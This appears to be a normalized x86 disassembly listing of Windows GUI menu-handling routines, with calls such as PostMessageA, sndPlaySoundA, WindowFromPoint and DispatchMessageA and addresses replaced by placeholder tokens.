call sub_473838
pop ecx
jmp r-xdata
dec al
je r-xdata
push ebp
mov eax rw-data
call sub_473978
pop ecx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2d8 ] 0x64
jle r-xdata
dec al
je r-xdata
push ebp
mov eax rw-data
call sub_473978
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub [ eax + 0x2d8 ] 0x64
push ebp
mov eax rw-data
call sub_473978
pop ecx
mov eax [ ebp - 0x8 ]
add [ eax + 0x2d8 ] 0x64
jmp r-xdata
push ebp
mov eax rw-data
call sub_473978
pop ecx
jmp r-xdata
sub_473b98
push ebx
push esi
mov esi eax
cmp [ esi + 0x296 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x2b0 ] 0x0
je r-xdata
mov eax [ esi + 0x2b0 ]
call sub_42c354
mov ebx eax
dec ebx
test ebx ebx
jle r-xdata
mov eax [ esi + 0x2b0 ]
call sub_473364
mov edx [ eax ]
call [ edx + 0x17c ]
dec ebx
jne r-xdata
sub_473bdc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x2c4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x2a8 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax + 0x28c ] edx
xor edx edx
call sub_475bd8
mov [ ebx + 0x296 ] 0x0
mov esi [ ebx + 0x2c4 ]
test esi esi
je r-xdata
mov [ eax + 0x288 ] 0x0
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x2b0 ] 0x0
je r-xdata
mov eax [ esi + 0x2b0 ]
call sub_473364
mov edi [ ebx + 0x2c4 ]
cmp eax edi
jne r-xdata
mov eax [ edi + 0x2b0 ]
call sub_473370
mov [ ebx + 0x296 ] 0x0
mov eax ebx
call sub_4747d4
test eax eax
je r-xdata
mov eax ebx
call sub_4747d4
mov eax [ eax + 0x40 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
sub_473c74
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
push 0x0
mov eax [ esi ]
push eax
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
mov eax ebx
mov edx [ eax ]
call [ edx + 0x180 ]
sub_473cb4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
push 0x0
mov eax [ esi ]
push eax
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
mov eax ebx
mov edx [ eax ]
call [ edx + 0x180 ]
sub_473ce8
push ebx
push esi
mov esi edx
mov edx esi
call sub_47fc60
mov ebx eax
xor edx edx
mov eax ebx
call sub_44c9c4
mov dl 0x1
mov eax esi
call sub_47f1b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor edx edx
jmp r-xdata
mov eax esi
call sub_47eb64
test eax eax
jne r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov dl 0x1
mov eax esi
call sub_47d670
test al al
je r-xdata
mov eax esi
call sub_47d6b0
call sub_47e30c
test eax eax
jg r-xdata
sub_473d58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_42c354
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
mov eax [ eax + 0x2ac ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
call sub_47d6b0
call sub_47e30c
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x15c ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x170 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_44f950
xor edx edx
push ebp
push sub_473f74
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_48254c
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x12c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_44ca14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x2c4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x224 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x224 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4750cc
mov eax [ ebp - 0xc ]
mov [ eax + 0x296 ] 0x1
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2ac ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov bl [ eax + 0x30 ]
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
call sub_4507ec
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x130 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473f7b
mov eax [ ebp - 0xc ]
call sub_44f958
retn
xor edx edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x164 ]
mov eax [ ebp - 0xc ]
call sub_480a00
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
call sub_47d6b0
cmp [ eax + 0x2a ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x295 ] bl
test bl bl
je r-xdata
sub_473f7b
mov eax [ ebp - 0xc ]
call sub_44cda4
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x300 ]
call sub_434118
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
sub_473fd4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x28c ] eax
mov eax [ ebx + 0x2c4 ]
mov [ eax + 0x28c ] esi
jmp r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x300 ]
xor edx edx
call sub_434118
mov eax ebx
call sub_4747d4
mov esi eax
mov eax ebx
call sub_480a00
cmp esi eax
je r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x304 ]
mov dl 0x1
call sub_434118
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
cmp [ eax + 0x294 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx eax
xor dl 0x1
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x300 ]
call sub_434118
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x300 ]
mov [ eax + 0xc ] 0x1
sub_47408c
push ebx
mov ebx eax
test edx edx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
push 0x2
push 0x0
call sndPlaySoundA
push 0x13
push r-xdata
call sndPlaySoundA
mov eax [ ebx + 0x2f4 ]
mov eax [ eax + 0x38 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_4740dc
push ebx
push ecx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x168 ]
mov [ esp ] eax
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_474110
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
xor edi edi
cmp ebx [ esi + 0x4 ]
jne r-xdata
mov eax [ esi + 0x16c ]
call sub_47d670
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edi [ esi + 0x16c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x28c ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x28c ] eax
mov eax ebx
call sub_473b98
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x1014
call SystemParametersInfoA
mov eax [ ebx + 0x2b0 ]
call sub_42c354
dec eax
jle r-xdata
cmp [ esi + 0x57 ] 0x0
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_473b98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esp ] 0x0
je r-xdata
mov eax [ ebx + 0x2c4 ]
call sub_475b5c
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_473364
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x164 ]
mov eax [ ebx + 0x2b0 ]
call sub_473364
mov edx [ ebx + 0x28c ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42c354
mov esi eax
sub esi 0x2
test esi esi
jle r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_473364
mov edx eax
mov ecx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14c ]
mov [ ebx + 0x288 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42c354
cmp eax 0x2
jne r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473370
xor eax eax
mov [ ebx + 0x28c ] eax
mov ebp 0x1
jmp r-xdata
mov edx ebp
mov eax [ ebx + 0x2b0 ]
call sub_473350
xor edx edx
call sub_44c794
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_42c354
cmp eax 0x2
jg r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_473364
mov edx [ eax ]
call [ edx + 0x17c ]
sub_4742a8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x297 ] 0x1
xor ecx ecx
push ebp
push sub_47431f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x150 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474326
mov eax [ ebp - 0x4 ]
mov [ eax + 0x297 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
call sub_480a00
test eax eax
je r-xdata
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ eax + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_474330
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
je r-xdata
test al al
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x290 ] 0x0
jne r-xdata
mov al 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
jne r-xdata
cmp [ ebx + 0x2a4 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x202
setne al
jmp r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x2a4 ]
call sub_4530b8
mov edi eax
call GetForegroundWindow
cmp edi eax
jne r-xdata
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al 0x1
mov eax [ ebx + 0x2c4 ]
test eax eax
je r-xdata
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x296 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x4 ] 0xb403
jne r-xdata
mov al 0x1
mov al 0x1
jmp r-xdata
sub_4743f0
push ebx
add esp 0xffffffe0
mov ebx eax
xor edx edx
mov eax [ ebx + 0x304 ]
call sub_434118
cmp [ ebx + 0x28c ] 0x0
je r-xdata
add esp 0x20
pop ebx
retn
mov eax [ ebx + 0x28c ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ eax + 0x16c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_42c354
dec eax
jle r-xdata
push esp
call GetCursorPos
mov eax [ ebx + 0x2b0 ]
call sub_473364
lea ecx [ esp + 0x8 ]
mov edx esp
call sub_44c3b8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x18 ]
mov eax [ ebx + 0x28c ]
call sub_44c214
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
mov edx [ ebx + 0x28c ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ ebx + 0x2b0 ]
call sub_473364
mov edx eax
mov ecx [ ebx + 0x28c ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14c ]
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473370
sub_4744d8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
xor edx edx
mov eax ebx
call sub_475bd8
lea eax [ ebx + 0x2f8 ]
call sub_40d4f0
xor eax eax
mov [ rw-data ] eax
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov [ ebx + 0x288 ] 0x1
push 0x0
call ShowCaret
lea eax [ ebx + 0x304 ]
call sub_40d4f0
lea eax [ ebx + 0x2b0 ]
call sub_40d4f0
lea eax [ ebx + 0x300 ]
call sub_40d4f0
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_474574
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x295 ] 0x1
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x294 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_480f04
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov [ eax + 0x295 ] dl
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_474632
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_480ed8
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov al [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
pop edx
call sub_44c794
inc ebx
dec esi
jne r-xdata
sub_474640
push esi
mov esi eax
xor edx edx
mov eax [ esi + 0x300 ]
call sub_434118
mov eax [ esi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
cmp [ eax + 0x294 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x300 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov [ esi + 0x295 ] 0x1
mov eax [ esi + 0x2b0 ]
call sub_473364
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x164 ]
mov eax [ esi + 0x2b0 ]
call sub_473364
mov eax [ eax + 0x30c ]
xor edx edx
call sub_4711c0
jmp r-xdata
sub_4746b0
push ebx
mov ebx eax
mov eax ebx
call sub_481878
test al al
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
cmp ebx [ ebx + 0x2a8 ]
je r-xdata
mov eax [ ebx + 0x2a8 ]
mov edx [ eax ]
call [ edx + 0x104 ]
sub_4746e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x7
[ edi ] [ esi ]
xor edx edx
mov [ esp ] edx
xor edi edi
mov esi [ eax + 0x2c4 ]
test esi esi
je r-xdata
mov eax [ esp ]
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x2b0 ]
call sub_42c354
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call WindowFromPoint
mov ebp eax
mov edx ebx
mov eax [ esi + 0x2b0 ]
call sub_473350
call sub_4530b8
cmp ebp eax
jne r-xdata
mov [ esp ] edi
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x2b0 ]
call sub_473350
mov edi eax
push 0x0
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
mov eax edi
call sub_44c3b8
lea edx [ esp + 0x24 ]
mov cl 0x1
mov eax edi
call sub_4509a4
mov edi eax
sub_474798
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_484674
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
pop ebx
retn
sub_4747d4
push ebx
push esi
push edi
push ebp
mov esi eax
xor ebp ebp
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
test eax eax
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov ebp [ eax + 0x16c ]
jmp r-xdata
sub_474834
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579c8
mov eax [ esp + 0x4 ]
mov [ ebx + 0x29c ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x2a0 ] eax
xor eax eax
mov [ ebx + 0x2f4 ] eax
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x28c ] eax
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x6a
call SystemParametersInfoA
cmp [ esp ] 0x0
jne r-xdata
mov [ esp ] 0x1
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc [ esp ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_433f90
mov esi eax
mov [ ebx + 0x304 ] esi
push ebx
push sub_4743f0
mov eax esi
call sub_434138
mov edx [ esp ]
mov eax [ ebx + 0x304 ]
call sub_434128
xor edx edx
mov eax [ ebx + 0x304 ]
call sub_434118
mov ecx ebx
mov dl 0x1
mov eax [ sub_4720d0 ]
call sub_473314
mov esi eax
mov [ ebx + 0x2b0 ] esi
mov edx ebx
mov eax esi
call sub_473404
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_433f90
mov esi eax
mov [ ebx + 0x300 ] esi
xor edx edx
mov eax esi
call sub_434118
mov edx [ ebx + 0x2c0 ]
mov eax esi
call sub_434128
push ebx
push sub_474640
mov eax esi
call sub_434138
mov [ ebx + 0x296 ] 0x1
push 0x0
call HideCaret
mov [ rw-data ] ebx
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
call sub_464294
test eax eax
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_47498c
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov eax [ edi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
cmp [ eax + 0x2f8 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ edi + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
mov ebx [ eax + 0x2f8 ]
lea eax [ ebx + 0x30c ]
call sub_40d4f0
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
push 0x96
push 0x32
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov edx ebx
mov eax [ edi + 0x2b0 ]
call sub_473404
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffb2
call sub_4034a4
mov ecx edi
mov dl 0x1
call [ eax + 0x2c ]
mov ebx eax
sub_474a20
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4746e0
test eax eax
jne r-xdata
push esi
call DispatchMessageA
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
je r-xdata
dec eax
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x14 ]
call WindowFromPoint
mov edi eax
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
call sub_4530b8
cmp edi eax
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
add eax 0xfffffffe
sub eax 0x2
jb r-xdata
mov eax ebx
call sub_464294
mov edi eax
test edi edi
je r-xdata
mov eax [ ebx + 0x2c4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ ebx + 0x2c4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
push 0x1
lea ecx [ esp + 0x4 ]
lea edx [ esi + 0x14 ]
mov eax ebx
call sub_44c3b8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax edi
call sub_4509a4
mov edi eax
test edi edi
je r-xdata
jmp r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov eax [ ebx + 0x2c4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
jmp r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_474b40
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x24 ]
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x16c ]
xor ecx ecx
push ebp
push sub_474e22
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_475994
cmp [ ebx + 0x4 ] 0x7b
jne r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push ebx
call PeekMessageA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x158 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_474330
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cc58
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x296 ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0x200
jge r-xdata
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
jmp r-xdata
cmp eax 0xb402
jg r-xdata
cmp eax 0xa4
jg r-xdata
sub eax 0xb403
je r-xdata
je r-xdata
sub eax 0xa7
je r-xdata
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x150 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f4 ] eax
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_473fd4
jmp r-xdata
add eax 0xfffffe00
sub eax 0xb
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
call sub_475b5c
push ebx
call DispatchMessageA
jmp r-xdata
add eax 0xffffffa7
sub eax 0x9
jb r-xdata
sub eax 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_473b6c
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x154 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f4 ] eax
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x178 ]
jmp r-xdata
sub eax 0xae16
je r-xdata
cmp [ ebx + 0x8 ] 0x70
jne r-xdata
jmp r-xdata
sub eax 0x91
je r-xdata
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
call sub_4747d4
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebx + 0x4 ] 0x104
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
call sub_4747d4
mov eax [ eax + 0x64 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
call sub_473364
lea edx [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
